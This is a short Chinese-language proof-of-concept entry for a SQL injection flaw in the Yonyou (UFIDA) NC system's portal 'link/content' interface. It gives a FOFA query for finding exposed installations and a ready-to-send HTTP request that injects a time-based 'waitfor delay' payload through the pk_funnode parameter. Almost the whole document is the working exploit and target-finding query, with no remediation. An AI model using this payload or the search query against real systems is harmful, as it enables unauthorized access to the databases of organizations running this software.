# 用友NC系统接口link存在SQL注入漏洞



## fofa

```yaml
app="用友-UFIDA-NC"
```

## poc

```yaml
GET /portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:0'--&pk_menuitem=2&pageModule=3&pageName=4 HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: http://www.baidu.com
Cache-Control: max-age=0
```

